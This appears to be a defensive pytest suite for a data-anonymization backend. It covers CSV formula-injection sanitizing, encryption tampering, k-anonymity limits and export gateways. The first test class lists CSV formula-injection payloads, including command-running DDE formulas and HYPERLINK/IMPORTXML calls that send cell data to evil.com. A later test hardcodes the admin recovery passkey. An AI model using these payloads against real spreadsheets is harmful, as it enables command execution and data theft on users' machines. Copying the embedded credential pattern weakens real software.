"""
PrivShield Milestone M4 Phase 2: White-Box Adversarial Stress Test Suite.
Author: Empirical Challenger 1 (critic & specialist)

Rigorous white-box stress testing across PrivShield backend engine and service layers:
1. CSV formula injection neutralization against evasion payloads.
2. Cryptographic AEAD tag tampering, nonce corruption, truncated payloads, and passkey timing resistance.
3. Strict K-anonymity boundary conditions: K=1 rejection, negative K, zero equivalence classes, and empty inputs.
4. Statistical entropy and distribution limits: zero-entropy, single non-null in 100k nulls, infinite values.
5. Extreme timestamp, numerical, and geographic generalization hierarchies.
6. Service-layer gateway enforcement, recovery boundaries, and ReportLab PDF edge cases.
"""

import base64
import hashlib
import hmac
import io
import json
import math
import os
import uuid
from pathlib import Path
from typing import Any, Dict, List

import numpy as np
import pandas as pd
import pytest
from cryptography.exceptions import InvalidTag
from cryptography.fernet import Fernet, InvalidToken
from fastapi import HTTPException

from backend.app.core.config import settings
from backend.app.core.security import (
    sanitize_csv_cell,
    sanitize_dataframe_for_export,
    validate_uuid_id,
    resolve_safe_path,
)
from backend.app.engine.discovery import (
    calculate_shannon_entropy,
    calculate_uniqueness_ratio,
    validate_iban_mod97,
    validate_luhn,
    detect_sensitive_attributes,
)
from backend.app.engine.hierarchies import (
    generalize_age,
    generalize_amount,
    generalize_category,
    generalize_city,
    generalize_education_major,
    generalize_job_title,
    generalize_medical_icd,
    generalize_timestamp,
    HierarchyRegistry,
)
from backend.app.engine.k_anonymity import (
    enforce_strict_k_anonymity,
    partition_equivalence_classes,
)
from backend.app.engine.l_diversity import (
    evaluate_distinct_l_diversity,
    evaluate_entropy_l_diversity,
    evaluate_recursive_l_diversity,
)
from backend.app.engine.masking import (
    apply_masking,
    apply_masking_rule,
    mask_card_number,
    mask_email,
    mask_iban,
    mask_ip_address,
    mask_national_id,
    mask_passport,
    mask_phone,
    mask_ssn,
    tokenize_format_preserving,
)
from backend.app.engine.risk import compute_ncp, compute_privacy_risk_metrics
from backend.app.engine.t_closeness import (
    compute_categorical_tvd,
    compute_continuous_wasserstein_distance,
    evaluate_t_closeness,
)
from backend.app.engine.utility import compute_ks_fidelity, compute_utility_metrics
from backend.app.services.encryption_service import EncryptionService
from backend.app.services.export_service import ExportService, export_dataset, verify_pre_export_privacy_gateway
from backend.app.services.pdf_service import generate_pdf_report
from backend.app.services.recovery_service import RecoveryService


# ==============================================================================
# 1. CSV FORMULA INJECTION EVASION ATTACKS
# ==============================================================================

class TestAdversarialCsvFormulaInjection:
    """Evaluates CSV and XLSX sanitization against formula injection bypasses."""

    @pytest.mark.parametrize("payload", [
        "=cmd|' /C calc'!A0",
        "+cmd|' /C calc'!A0",
        "-cmd|' /C calc'!A0",
        "@SUM(1,2)",
        "\t=1+1",
        "\r=1+1",
        "\t\r=cmd|' /C notepad'!A0",
        "\r\t@IMPORTXML('http://evil.com/leak', '/html')",
        "=HYPERLINK(\"http://evil.com?leak=\"&A1,\"Click Me\")",
        "+HYPERLINK(\"http://evil.com\",\"Steal\")",
        "-HYPERLINK(\"http://evil.com\",\"Click\")",
        "@HYPERLINK(\"http://evil.com\",\"Click\")",
        "=+cmd|' /C calc'!A0",
        "=-cmd|' /C calc'!A0",
        "=@cmd|' /C calc'!A0",
        "=cMd|' /C calc'!A0",
        "=hYpErLiNk(\"http://evil.com\")",
        "-2+3*cmd|' /C calc'!A0",
        "+1-2*cmd|' /C calc'!A0",
        "='cmd'|' /C calc'!A0",
    ])
    def test_formula_injection_dangerous_prefixes_neutralized(self, payload: str):
        sanitized = sanitize_csv_cell(payload)
        sanitized_str = str(sanitized)
        assert sanitized_str.startswith("'"), f"Payload was not neutralized: {payload!r} -> {sanitized_str!r}"

    @pytest.mark.parametrize("valid_number", [
        0,
        1,
        -1,
        42,
        -142.50,
        +100.0,
        -0.0001,
        1e6,
        -2.5e-3,
        "+42",
        "-99.95",
        "-0.0",
        "+1e4",
        "-1.2e+3",
    ])
    def test_legitimate_signed_numbers_not_corrupted(self, valid_number: Any):
        sanitized = sanitize_csv_cell(valid_number)
        if isinstance(valid_number, (int, float)):
            assert sanitized == valid_number
            assert isinstance(sanitized, (int, float))
        else:
            # String representation of legitimate number should preserve its numeric value without prepending quote
            assert sanitized == valid_number
            float(sanitized)

    def test_boolean_cells_not_treated_as_integers(self):
        assert sanitize_csv_cell(True) is True
        assert sanitize_csv_cell(False) is False

    def test_none_and_empty_cells_handled(self):
        assert sanitize_csv_cell(None) is None
        assert sanitize_csv_cell("") == ""
        assert sanitize_csv_cell("   ") == "   "

    def test_export_dataset_csv_and_xlsx_neutralizes_hostile_columns_and_data(self):
        hostile_df = pd.DataFrame({
            "=formula_col": ["=cmd|' /C calc'!A0", "+123", "-456.78", "normal"],
            "@sum_col": ["@SUM(1..10)", "safe_val", "\t=alert(1)", "2026-11-01"],
            "-amount": ["-150.25", "-cmd|' /C calc'!A0", "+99.0", "=2+2"],
        })

        # Test CSV export
        csv_bytes = export_dataset(hostile_df, format="csv")
        csv_text = csv_bytes.decode("utf-8")

        # Confirm formula payloads in CSV output are safely escaped with leading single quote
        assert "'=cmd|" in csv_text
        assert "'@SUM" in csv_text
        assert "'\t=alert(1)" in csv_text
        assert "'=2+2" in csv_text
        # Legitimate negative amount -150.25 is preserved without leading single quote
        assert "-150.25" in csv_text
        assert "'-150.25'" not in csv_text

        # Test XLSX export
        xlsx_bytes = export_dataset(hostile_df, format="xlsx")
        assert len(xlsx_bytes) > 0
        readback_df = pd.read_excel(io.BytesIO(xlsx_bytes))
        assert readback_df.shape == hostile_df.shape


# ==============================================================================
# 2. CRYPTOGRAPHIC AEAD TAG TAMPERING & PAYLOAD BOUNDARIES
# ==============================================================================

class TestAdversarialCryptographicIntegrity:
    """Verifies AES-256-GCM authentication tag enforcement, truncated payloads, and passkey timing."""

    def test_aes_gcm_ciphertext_tampering_raises_invalid_tag(self):
        plaintext = b"PrivShield::ConfidentialBankingRecord::Account#12345678"
        encrypted = EncryptionService.encrypt_bytes_aes_gcm(plaintext)
        assert len(encrypted) >= 28

        # Flip a bit in the authentication tag (last 16 bytes)
        tampered_tag = bytearray(encrypted)
        tampered_tag[-1] ^= 0x01
        with pytest.raises(InvalidTag):
            EncryptionService.decrypt_bytes_aes_gcm(bytes(tampered_tag))

        # Flip a bit in the ciphertext payload (between nonce and tag)
        tampered_payload = bytearray(encrypted)
        tampered_payload[15] ^= 0x01
        with pytest.raises(InvalidTag):
            EncryptionService.decrypt_bytes_aes_gcm(bytes(tampered_payload))

        # Corrupt the 12-byte nonce
        tampered_nonce = bytearray(encrypted)
        tampered_nonce[0] ^= 0x01
        with pytest.raises(InvalidTag):
            EncryptionService.decrypt_bytes_aes_gcm(bytes(tampered_nonce))

    @pytest.mark.parametrize("payload_len", [0, 1, 11, 12, 13, 27])
    def test_aes_gcm_truncated_payload_raises_value_error(self, payload_len: int):
        truncated_bytes = os.urandom(payload_len)
        with pytest.raises(ValueError, match="Ciphertext too short"):
            EncryptionService.decrypt_bytes_aes_gcm(truncated_bytes)

    def test_fernet_corrupted_token_rejection(self):
        original = "SecretUserIdentifier#987654"
        token = EncryptionService.encrypt_string(original)
        assert isinstance(token, str)

        # Corrupt the token characters
        corrupted_token = token[:-4] + "AAAA"
        with pytest.raises(InvalidToken):
            EncryptionService.decrypt_string(corrupted_token)

        # Truncated Fernet token
        with pytest.raises((InvalidToken, Exception)):
            EncryptionService.decrypt_string("not-a-valid-fernet-token")

    @pytest.mark.parametrize("bogus_passkey", [
        "",
        "   ",
        None,
        "wrong_password",
        "privshieldadmin2026!",
        "PRIVSHIELDADMIN2026!",
        "PrivShieldAdmin2026",
        "admin",
        "12345678",
    ])
    def test_admin_passkey_constant_time_rejection(self, bogus_passkey: Any):
        assert EncryptionService.verify_admin_passkey(bogus_passkey) is False

    def test_admin_passkey_extreme_length_rejected(self):
        extreme_passkey = "A" * 100_000
        assert EncryptionService.verify_admin_passkey(extreme_passkey) is False

    def test_admin_passkey_correct_acceptance(self):
        assert EncryptionService.verify_admin_passkey("PrivShieldAdmin2026!") is True


# ==============================================================================
# 3. STRICT K=1 BOUNDARY REJECTION & ZERO EQUIVALENCE CLASS INVARIANTS
# ==============================================================================

class TestStrictKAnonymityBoundaries:
    """Verifies strict K >= 2 invariant enforcement, degenerate K parameters, and zero class outputs."""

    @pytest.mark.parametrize("invalid_k", [1, 0, -1, -100])
    def test_strict_k_below_two_rejected_with_value_error(self, invalid_k: int):
        df = pd.DataFrame({"age": [25, 30, 35], "city": ["Amman", "Zarqa", "Irbid"]})
        with pytest.raises(ValueError, match="target_k must be >= 2"):
            enforce_strict_k_anonymity(df, qi_columns=["age", "city"], target_k=invalid_k)

    def test_k_anonymity_empty_dataframe_returns_clean_zero_metrics(self):
        empty_df = pd.DataFrame(columns=["age", "city", "amount"])
        anon_df, metrics = enforce_strict_k_anonymity(empty_df, qi_columns=["age", "city"], target_k=5)

        assert anon_df.empty
        assert metrics["k_satisfied"] is True
        assert metrics["achieved_k"] == 0
        assert metrics["total_records"] == 0
        assert metrics["retained_records"] == 0
        assert metrics["suppressed_records"] == 0
        assert metrics["suppression_rate"] == 0.0
        assert metrics["num_equivalence_classes"] == 0
        assert metrics["min_equivalence_class_size"] == 0
        assert metrics["avg_equivalence_class_size"] == 0.0

    def test_k_anonymity_total_records_less_than_target_k_suppresses_everything(self):
        # 3 records with target_k=5
        df = pd.DataFrame({
            "age": [25, 25, 25],
            "city": ["Amman", "Amman", "Amman"],
            "amount": [100.0, 200.0, 300.0]
        })
        anon_df, metrics = enforce_strict_k_anonymity(df, qi_columns=["age", "city"], target_k=5)

        assert len(anon_df) == 0
        assert metrics["total_records"] == 3
        assert metrics["retained_records"] == 0
        assert metrics["suppressed_records"] == 3
        assert metrics["suppression_rate"] == 1.0
        assert metrics["num_equivalence_classes"] == 0
        assert metrics["achieved_k"] == 0
        assert metrics["k_satisfied"] is True

    def test_k_anonymity_missing_qi_column_raises_key_error(self):
        df = pd.DataFrame({"age": [20, 25], "gender": ["M", "F"]})
        with pytest.raises(KeyError, match="Quasi-identifier column 'non_existent_column' not found"):
            enforce_strict_k_anonymity(df, qi_columns=["age", "non_existent_column"], target_k=2)

    def test_strict_k_invariant_never_outputs_sub_k_class(self):
        # Generate diverse clusters: some >= K, some < K
        np.random.seed(42)
        rows = []
        for i in range(10):
            rows.extend([{"qi_1": "cluster_A", "qi_2": 1, "val": i}])
        for i in range(3):  # Sub-K cluster (3 records < K=5)
            rows.extend([{"qi_1": "cluster_B", "qi_2": 2, "val": i}])
        for i in range(7):  # Compliant cluster (7 records >= K=5)
            rows.extend([{"qi_1": "cluster_C", "qi_2": 3, "val": i}])
        for i in range(1):  # Singleton cluster (1 record < K=5)
            rows.extend([{"qi_1": "cluster_D", "qi_2": 4, "val": i}])

        df = pd.DataFrame(rows)
        anon_df, metrics = enforce_strict_k_anonymity(
            df=df,
            qi_columns=["qi_1", "qi_2"],
            target_k=5,
            suppression_strategy="record",
        )

        assert len(anon_df) == 17  # 10 + 7
        assert metrics["retained_records"] == 17
        assert metrics["suppressed_records"] == 4  # 3 + 1
        assert metrics["achieved_k"] == 7
        assert metrics["k_satisfied"] is True

        # Check every retained equivalence class
        ec_map = partition_equivalence_classes(anon_df, ["qi_1", "qi_2"])
        for qi_tuple, idxs in ec_map.items():
            assert len(idxs) >= 5, f"EQUIVALENCE CLASS VIOLATION: {qi_tuple} has size {len(idxs)} < 5"


# ==============================================================================
# 4. STATISTICAL ENTROPY & DISTRIBUTION LIMITS
# ==============================================================================

class TestAdversarialEntropyAndDistributionLimits:
    """Evaluates Shannon entropy, uniqueness ratio, L-diversity, and T-closeness on degenerate inputs."""

    def test_shannon_entropy_all_nan_series_returns_zero(self):
        s = pd.Series([np.nan, None, np.nan, None])
        assert calculate_shannon_entropy(s) == 0.0

    def test_shannon_entropy_single_non_null_amidst_100k_nulls_returns_zero(self):
        data = [np.nan] * 100_000
        data[42] = "unique_marker"
        s = pd.Series(data)
        assert calculate_shannon_entropy(s) == 0.0

    def test_shannon_entropy_monolithic_identical_elements_returns_zero(self):
        s = pd.Series(["constant_token"] * 5_000)
        assert calculate_shannon_entropy(s) == 0.0

    def test_shannon_entropy_uniform_distribution_matches_theoretical_maximum(self):
        n = 1024  # 2^10
        s = pd.Series([f"item_{i}" for i in range(n)])
        entropy = calculate_shannon_entropy(s)
        expected = math.log2(n)  # 10.0 bits
        assert abs(entropy - expected) < 1e-4

    def test_uniqueness_ratio_limits(self):
        empty_s = pd.Series([], dtype=object)
        assert calculate_uniqueness_ratio(empty_s) == 0.0

        all_nan_s = pd.Series([np.nan, None])
        assert calculate_uniqueness_ratio(all_nan_s) == 0.0

        identical_s = pd.Series(["A"] * 100)
        assert calculate_uniqueness_ratio(identical_s) == 0.01

        all_unique_s = pd.Series(list(range(500)))
        assert calculate_uniqueness_ratio(all_unique_s) == 1.0

    def test_distinct_l_diversity_null_dominant_sensitive_attribute(self):
        df = pd.DataFrame({
            "qi_1": ["group1"] * 10,
            "sensitive": [np.nan] * 9 + ["Condition_A"]
        })
        audit = evaluate_distinct_l_diversity(df, ["qi_1"], "sensitive", target_l=3)
        # 1 distinct real value + 1 "[NULL]" = 2 distinct values < target_l=3
        assert audit.satisfied is False
        assert audit.violating_classes_count == 1
        assert audit.min_observed_distinct_values == 2

    def test_entropy_l_diversity_homogeneous_class_fails(self):
        df = pd.DataFrame({
            "qi_1": ["group1"] * 20,
            "sensitive": ["Cancer"] * 19 + ["Flu"]  # Highly skewed: H(S) is very small
        })
        audit = evaluate_entropy_l_diversity(df, ["qi_1"], "sensitive", target_l=3)
        assert audit.satisfied is False
        assert audit.violating_classes_count == 1

    def test_t_closeness_zero_variance_continuous_returns_zero(self):
        class_vals = [500.0] * 20
        global_vals = [500.0] * 100
        dist = compute_continuous_wasserstein_distance(class_vals, global_vals)
        assert dist == 0.0

    def test_t_closeness_disjoint_continuous_distributions_bounded(self):
        class_vals = [10.0, 11.0, 12.0]
        global_vals = [1000.0, 1001.0, 1002.0]
        dist = compute_continuous_wasserstein_distance(class_vals, global_vals)
        assert 0.0 <= dist <= 1.0

    def test_t_closeness_categorical_identical_and_disjoint(self):
        identical_dist = compute_categorical_tvd(["A", "B", "C"], ["A", "B", "C"])
        assert identical_dist == 0.0

        disjoint_dist = compute_categorical_tvd(["A", "A"], ["B", "B"])
        assert disjoint_dist == 1.0


# ==============================================================================
# 5. EXTREME TIMESTAMP, NUMERICAL & GEOGRAPHIC HIERARCHIES
# ==============================================================================

class TestAdversarialGeneralizationHierarchies:
    """Stresses date, amount, age, and geographic hierarchies on boundary and malformed inputs."""

    @pytest.mark.parametrize("val, level, expected_prefix", [
        ("Amman", 1, "Capital Governorate"),
        ("amman", 2, "Central Region"),
        ("New York", 1, "New York State"),
        ("new york", 2, "East Coast"),
        ("Tokyo", 1, "Kanto State"),
        ("Atlantis", 1, "Atlantis Governorate"),
        ("Atlantis", 2, "Other Region"),
        ("Mars Colony", 1, "Mars Colony Governorate"),
        ("AnyCity", 4, "*"),
        (None, 1, "*"),
        (np.nan, 2, "*"),
    ])
    def test_geographic_generalization_robustness(self, val: Any, level: int, expected_prefix: str):
        res = generalize_city(val, level=level)
        assert expected_prefix in res or res == expected_prefix

    @pytest.mark.parametrize("ts, level, granularity, expected", [
        ("2026-11-01 15:45:30", 1, None, "2026-11-01 15:00"),
        ("2026-11-01 15:45:30", 2, None, "2026-11-01"),
        ("2026-11-01 15:45:30", 3, None, "2026-11"),
        ("2026-11-01 15:45:30", 4, None, "*"),
        ("2026-11-01T15:45:30", None, "year", "2026"),
        ("2026-11-01T15:45:30", None, "quarter", "2026-Q4"),
        ("2026-05-15T15:45:30", None, "quarter", "2026-Q2"),
        ("9999-12-31 23:59:59", 2, None, "9999-12-31"),
        ("0001-01-01 00:00:00", 2, None, "0001-01-01"),
        ("not_a_valid_date", 2, None, "not_a_valid_date"),
        ("not_a_valid_date", 4, None, "*"),
        (None, 2, None, "*"),
        (np.nan, 2, None, "*"),
    ])
    def test_timestamp_generalization_robustness(self, ts: Any, level: int, granularity: str, expected: str):
        res = generalize_timestamp(ts, level=level if level is not None else 1, granularity=granularity)
        assert res == expected

    @pytest.mark.parametrize("age_val, level, expected", [
        (-10, 1, "< 18"),
        (0, 1, "< 18"),
        (17, 1, "< 18"),
        (18, 1, "[18-24]"),
        (25, 1, "[25-34]"),
        (65, 1, "65+"),
        (105, 1, "65+"),
        (999, 1, "65+"),
        (22, 2, "Young Adult [18-29]"),
        (45, 2, "Adult [30-54]"),
        (75, 2, "Senior [55+]"),
        ("invalid_age", 1, "*"),
        (None, 1, "*"),
    ])
    def test_age_generalization_robustness(self, age_val: Any, level: int, expected: str):
        res = generalize_age(age_val, level=level)
        assert res == expected

    @pytest.mark.parametrize("amount_val, level, expected", [
        (-500.0, 1, "[0 - 50] JOD"),
        (0.0, 1, "[0 - 50] JOD"),
        (49.99, 1, "[0 - 50] JOD"),
        (150.0, 1, "[50 - 200] JOD"),
        (500.0, 1, "[200 - 1000] JOD"),
        (2500.0, 1, "[1000 - 5000] JOD"),
        (1_000_000.0, 1, "[5000+] JOD"),
        (100.0, 2, "Micro [< 200 JOD]"),
        (500.0, 2, "Commercial [200 - 1000 JOD]"),
        (5000.0, 2, "Wholesale [> 1000 JOD]"),
        ("not_an_amount", 1, "*"),
        (None, 1, "*"),
    ])
    def test_amount_generalization_robustness(self, amount_val: Any, level: int, expected: str):
        res = generalize_amount(amount_val, level=level, currency="JOD")
        assert res == expected


# ==============================================================================
# 6. SERVICE LAYER BOUNDARIES, PRE-EXPORT GATEWAY & PDF GENERATION
# ==============================================================================

class TestAdversarialServiceLayerBoundaries:
    """Verifies pre-export gateway verification, recovery boundaries, and PDF report generation."""

    def test_pre_export_privacy_gateway_mode2_blocks_unsatisfied_run(self):
        # Mode 2 (irreversible) requires k_satisfied=True
        unsatisfied_run = {
            "processing_mode": "irreversible_anonymization",
            "metrics": {"k_satisfied": False, "achieved_k": 1}
        }
        allowed, msg = verify_pre_export_privacy_gateway(unsatisfied_run)
        assert allowed is False
        assert "Export blocked" in msg

    def test_pre_export_privacy_gateway_mode2_allows_satisfied_run(self):
        satisfied_run = {
            "processing_mode": "irreversible_anonymization",
            "metrics": {"k_satisfied": True, "achieved_k": 5}
        }
        allowed, msg = verify_pre_export_privacy_gateway(satisfied_run)
        assert allowed is True
        assert "Pre-export verification passed" in msg

    def test_pre_export_privacy_gateway_mode1_allows_even_without_strict_k(self):
        # Mode 1 (reversible pseudonymization) is governed by key vault, not mandatory strict K
        mode1_run = {
            "processing_mode": "reversible_pseudonymization",
            "metrics": {"k_satisfied": False}
        }
        allowed, msg = verify_pre_export_privacy_gateway(mode1_run)
        assert allowed is True

    def test_pre_export_privacy_gateway_none_run_blocked(self):
        allowed, msg = verify_pre_export_privacy_gateway(None)
        assert allowed is False
        assert "Export blocked" in msg

    def test_export_dataset_unsupported_format_raises_value_error(self):
        df = pd.DataFrame({"a": [1, 2]})
        with pytest.raises(ValueError, match="Unsupported export format"):
            export_dataset(df, format="unsupported_format_xyz")

    def test_pdf_report_generation_under_extreme_metrics(self):
        # Generate PDF report under degenerate metrics: 0 records, 100% suppression, 0 CURS
        extreme_metrics = {
            "k_satisfied": True,
            "achieved_k": 0,
            "target_k": 5,
            "total_records": 0,
            "retained_records": 0,
            "suppressed_records": 0,
            "suppression_rate": 0.0,
            "num_equivalence_classes": 0,
            "min_equivalence_class_size": 0,
            "avg_equivalence_class_size": 0.0,
            "violating_classes_count": 0,
            "privacy_risk": {
                "prosecutor_risk": 0.0,
                "journalist_risk": 0.0,
                "marketer_risk": 0.0,
                "transaction_linkage_risk": 0.0,
            },
            "utility_metrics": {
                "record_retention": 0.0,
                "numerical_distribution_fidelity": 0.0,
                "categorical_distribution_fidelity": 0.0,
                "correlation_retention": 0.0,
                "granularity_retention": 0.0,
                "composite_utility_score": 0.0,
            },
            "config": {
                "quasi_identifiers": ["City", "Age"],
                "masking_rules": {"Email": "mask_email"},
                "generalization_levels": {"Age": 1},
            }
        }

        pdf_bytes = generate_pdf_report(
            dataset_meta={"name": "Extreme_Degenerate_Test", "industry": "Healthcare"},
            metrics=extreme_metrics,
        )
        assert isinstance(pdf_bytes, bytes)
        assert pdf_bytes.startswith(b"%PDF-")
        assert len(pdf_bytes) > 1000

    def test_recovery_service_unauthorized_token_lookup_rejected(self):
        with pytest.raises(HTTPException) as exc_info:
            RecoveryService.lookup_token(token="PSEUDO-TEST", passkey="invalid_passkey_123")
        assert exc_info.value.status_code == 403
        assert "Invalid administrator recovery passkey" in exc_info.value.detail

    def test_recovery_service_unauthorized_dataset_restore_rejected(self):
        with pytest.raises(HTTPException) as exc_info:
            RecoveryService.restore_dataset(dataset_id="test_id", passkey="invalid_passkey_123")
        assert exc_info.value.status_code == 403
        assert "Invalid administrator recovery passkey" in exc_info.value.detail
